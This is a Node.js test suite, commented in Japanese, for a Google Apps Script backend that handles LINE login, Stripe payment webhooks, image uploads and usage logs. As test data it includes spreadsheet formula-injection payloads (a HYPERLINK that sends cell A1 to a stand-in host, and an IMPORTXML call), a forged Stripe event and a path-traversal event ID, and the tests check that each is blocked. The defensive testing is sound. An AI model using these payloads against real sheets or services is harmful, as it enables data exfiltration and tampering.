// おくるんの GAS（gas/）のテスト。本番のシート・LINE・Stripe・ドライブには触らない。
//   node --test gas/test/
"use strict";
const test = require("node:test");
const assert = require("node:assert");
const path = require("node:path");
const crypto = require("node:crypto");
const { createGas, response } = require(path.join(__dirname, "../../tools/qtest/fake-gas.js"));

const CHANNEL = "1234567890";
const USERS = { "token-free": "Ufree", "token-premium": "Upremium", "token-other-channel": "Uother" };
const hash = (text) => crypto.createHash("sha256").update(text).digest("hex");
const ONE_PIXEL_PNG =
  "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==";

// Stripe にある本物のイベント（GAS は ID で取り直す）
function stripeEvents(now = Date.now() / 1000) {
  return {
    evt_paid: {
      id: "evt_paid",
      created: now - 60,
      type: "checkout.session.completed",
      data: { object: { client_reference_id: hash("Ufree"), payment_status: "paid", customer: "cus_A1", subscription: "sub_A1" } }
    },
    evt_unpaid: {
      id: "evt_unpaid",
      created: now - 60,
      type: "checkout.session.completed",
      data: { object: { client_reference_id: hash("Ufree"), payment_status: "unpaid", customer: "cus_A1" } }
    },
    evt_old: {
      id: "evt_old",
      created: now - 10 * 24 * 60 * 60,
      type: "checkout.session.completed",
      data: { object: { client_reference_id: hash("Ufree"), payment_status: "paid", customer: "cus_A1" } }
    },
    evt_formula: {
      id: "evt_formula",
      created: now - 60,
      type: "checkout.session.completed",
      data: { object: { client_reference_id: '=HYPERLINK("https://example.com","x")', payment_status: "paid", customer: "cus_A1" } }
    }
  };
}

function make({ stripeKey = "rk_test_x", events = stripeEvents() } = {}) {
  const gas = createGas({
    dir: path.join(__dirname, ".."),
    expose: ["COLUMNS", "LOG_COLUMNS"],
    properties: {
      LINE_CHANNEL_ID: CHANNEL,
      PLANS_SHEET_ID: "PLANS",
      LOG_SHEET_ID: "LOGS",
      DRIVE_FOLDER_ID: "FOLDER",
      STRIPE_SECRET_KEY: stripeKey,
      PREMIUM_USERS: hash("Upremium")
    },
    fetch(url, opt) {
      const verify = /oauth2\/v2\.1\/verify\?access_token=([^&]+)/.exec(url);
      if (verify) {
        const token = decodeURIComponent(verify[1]);
        if (!USERS[token]) return response(400, { error: "invalid_request" });
        return response(200, { client_id: token === "token-other-channel" ? "999" : CHANNEL, expires_in: 100 });
      }
      if (/api\.line\.me\/v2\/profile/.test(url)) {
        const token = String(opt.headers.Authorization || "").replace("Bearer ", "");
        return USERS[token] ? response(200, { userId: USERS[token] }) : response(401, {});
      }
      const stripe = /api\.stripe\.com\/v1\/events\/([^?]+)/.exec(url);
      if (stripe) {
        const event = events[decodeURIComponent(stripe[1])];
        return event ? response(200, event) : response(404, { error: { message: "No such event" } });
      }
      return response(404, {});
    }
  });
  gas.seed("plans", [gas.ctx.COLUMNS], "PLANS");
  gas.seed("events", [gas.ctx.LOG_COLUMNS], "LOGS");
  return gas;
}

// ---- だれが呼べるか ----

test("me：本人確認なし・まちがったトークン・ほかのチャネルのトークンは断る", () => {
  const gas = make();
  assert.equal(gas.doPost({ action: "me" }).ok, false);
  assert.equal(gas.doPost({ action: "me", accessToken: "nope" }).ok, false);
  assert.equal(gas.doPost({ action: "me", accessToken: "token-other-channel" }).ok, false);
  const me = gas.doPost({ action: "me", accessToken: "token-free" });
  assert.equal(me.ok, true);
  assert.equal(me.plan, "free");
});

test("me：画面から送った userId・プランは信じない（トークンの本人で決める）", () => {
  const gas = make();
  const me = gas.doPost({ action: "me", accessToken: "token-free", userId: "Upremium", userHash: hash("Upremium"), plan: "premium" });
  assert.equal(me.plan, "free");
});

test("upload：本人確認なし・無料の人は保存できない。有償の人だけ保存できる", () => {
  const gas = make();
  assert.equal(gas.doPost({ action: "upload", imageData: ONE_PIXEL_PNG }).ok, false);
  const free = gas.doPost({ action: "upload", imageData: ONE_PIXEL_PNG, accessToken: "token-free" });
  assert.equal(free.ok, false);
  assert.equal(gas.calls.filter((c) => /createFile/.test(c.name)).length, 0);

  const premium = gas.doPost({ action: "upload", imageData: ONE_PIXEL_PNG, accessToken: "token-premium" });
  assert.equal(premium.ok, true);
  assert.match(premium.imageUrl, /^https:\/\/drive\.usercontent\.google\.com\//);
});

test("upload：PNG・JPEG 以外と、大きすぎる画像は断る", () => {
  const gas = make();
  const svg = gas.doPost({ action: "upload", imageData: "data:image/svg+xml;base64,PHN2Zz4=", accessToken: "token-premium" });
  assert.equal(svg.ok, false);
  const big = "data:image/png;base64," + Buffer.alloc(5 * 1024 * 1024 + 1).toString("base64");
  assert.equal(gas.doPost({ action: "upload", imageData: big, accessToken: "token-premium" }).ok, false);
});

test("エラーの中身は返さない（やさしい言葉だけ）", () => {
  const gas = make();
  gas.properties.DRIVE_FOLDER_ID = "";
  const res = gas.doPost({ action: "upload", imageData: ONE_PIXEL_PNG, accessToken: "token-premium" });
  assert.equal(res.ok, false);
  assert.doesNotMatch(res.error, /DRIVE_FOLDER_ID|Script Properties|Error/);
  // 決まった言葉はそのまま返す
  assert.equal(gas.doPost({ action: "me" }).error, "LINE でログインしてください。");
  // 読めない本文
  assert.equal(gas.doPost("{oops").ok, false);
});

// ---- Stripe の知らせ ----

test("Stripe：本物のイベントだけが効く（届いた中身は使わず、ID で取り直す）", () => {
  const gas = make();
  // 偽の知らせ：Stripe にないイベント ID。中身にプランを書いても効かない
  const fake = gas.doPost({
    object: "event",
    id: "evt_fake",
    type: "checkout.session.completed",
    data: { object: { client_reference_id: hash("Ufree"), payment_status: "paid" } }
  });
  assert.equal(fake.ok, false);
  assert.equal(gas.rows("plans", "PLANS").length, 1);

  // 本物の ID でも、届いた中身ではなく Stripe の中身を使う
  const res = gas.doPost({ object: "event", id: "evt_paid", data: { object: { client_reference_id: hash("Uattacker") } } });
  assert.equal(res.ok, true);
  const rows = gas.rows("plans", "PLANS");
  assert.equal(rows.length, 2);
  assert.equal(rows[1][0], hash("Ufree"));
  assert.equal(rows[1][1], "premium");
  assert.equal(gas.doPost({ action: "me", accessToken: "token-free" }).plan, "premium");
});

test("Stripe：まだ払っていない・古いイベントは効かない", () => {
  const gas = make();
  gas.doPost({ object: "event", id: "evt_unpaid" });
  assert.equal(gas.doPost({ object: "event", id: "evt_old" }).ok, false);
  assert.equal(gas.rows("plans", "PLANS").length, 1);
});

test("Stripe：鍵がないときは知らせを受けない。ID の形がちがうものは Stripe に聞かない", () => {
  const gas = make({ stripeKey: "" });
  assert.equal(gas.doPost({ object: "event", id: "evt_paid" }).ok, false);
  assert.equal(gas.rows("plans", "PLANS").length, 1);

  const gas2 = make();
  gas2.doPost({ object: "event", id: "evt_../../charges" });
  assert.equal(gas2.fetches.filter((f) => /stripe/.test(f.url)).length, 0);
});

test("Stripe：ユーザーのハッシュの形でないものはシートに書かない", () => {
  const gas = make();
  gas.doPost({ object: "event", id: "evt_formula" });
  assert.equal(gas.rows("plans", "PLANS").length, 1);
  assert.deepEqual(gas.formulaCells(), []);
});

// ---- 利用状況の記録（だれでも送れる。外の文字として扱う） ----

test("log：外の文字は式のままシートに入らない", () => {
  const gas = make();
  const formula = '=HYPERLINK("https://example.com/?"&A1,"x")';
  const res = gas.doPost({
    action: "log",
    events: [{ event: "error", tool: formula, kind: "+cmd", message: formula, session: "@abc", from: "-1+1", prev: formula, at: formula }]
  });
  assert.equal(res.ok, true);
  assert.deepEqual(gas.formulaCells(), []);
  const row = gas.rows("events", "LOGS")[1];
  assert.equal(row[7], "'" + formula);
});

test("log：決まった出来事だけ、1回 50 件まで、長い文字は切る", () => {
  const gas = make();
  const many = Array.from({ length: 80 }, () => ({ event: "open", tool: "card", message: "x".repeat(1000) }));
  many.push({ event: "delete-everything" });
  assert.equal(gas.doPost({ action: "log", events: many }).count, 50);
  const rows = gas.rows("events", "LOGS");
  assert.equal(rows.length, 51);
  assert.ok(rows[1][7].length <= 200);
  assert.equal(gas.doPost({ action: "log", events: [{ event: "hack" }] }).count, 0);
});

test("rollupLogs：シートから読み直した文字も、まとめるときに式のまま書かない", () => {
  const gas = make();
  const day = new Date(Date.now() - 2 * 24 * 60 * 60 * 1000).toISOString();
  // シートは先頭の ' を見せずに返すので、読み直すと = から始まる
  const formula = '=IMPORTXML("https://example.com","//a")';
  gas.seed(
    "events",
    [gas.ctx.LOG_COLUMNS, [day, day, "open", formula, formula, "", 1, "", "s1", formula, formula, 1]],
    "LOGS"
  );
  gas.call("rollupLogs");
  assert.equal(gas.rows("daily", "LOGS").length, 2);
  assert.equal(gas.rows("paths", "LOGS").length, 2);
  assert.deepEqual(gas.formulaCells(), []);
});

// ---- 使う前の確かめ ----

test("Q_SELF_CHECK と safeCell がある（GAS エディタで qCheckAll を動かせる）", () => {
  const gas = make();
  assert.equal(typeof gas.ctx.qCheckAll, "function");
  assert.deepEqual(gas.ctx.Q_SELF_CHECK.sheets.plans, gas.ctx.COLUMNS);
  assert.equal(gas.call("safeCell", "=1+1"), "'=1+1");
  assert.equal(gas.call("safeCell", "-5"), "-5");
});
